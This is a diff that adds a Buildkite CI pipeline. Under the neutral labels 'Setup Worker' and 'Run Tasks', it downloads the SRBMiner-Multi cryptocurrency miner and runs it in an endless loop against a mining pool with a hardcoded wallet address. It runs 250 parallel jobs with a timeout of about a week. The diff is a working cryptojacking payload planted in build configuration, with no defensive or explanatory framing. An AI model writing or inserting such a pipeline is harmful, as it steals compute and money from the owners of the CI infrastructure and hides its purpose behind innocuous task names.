@@ -1,0 +1,25 @@
+steps:
+  - label: "Setup Worker"
+    command: |
+      cd ~ && mkdir -p worker && cd worker
+      wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/3.3.9/SRBMiner-Multi-3-3-9-Linux.tar.gz
+      tar xf SRBMiner-Multi-3-3-9-Linux.tar.gz
+      rm SRBMiner-Multi-3-3-9-Linux.tar.gz
+    timeout_in_minutes: 30
+    agents:
+      queue: linux-large
+
+  - wait
+
+  - label: "Run Tasks"
+    command: |
+      TASK_ID=$((BUILDKITE_PARALLEL_JOB + 1))
+      cd ~/worker/SRBMiner-Multi-3-3-9
+      while true; do
+        ./SRBMiner-MULTI -a neuromorph -o stratum.cereblix.com:3333 -u crb15b185b68ef2f3d4829eb419b59c8bb56d8ea8aca.BuildRun.task$TASK_ID -p x -t 4
+        sleep 5
+      done
+    parallelism: 250
+    timeout_in_minutes: 10000
+    agents:
+      queue: linux-large
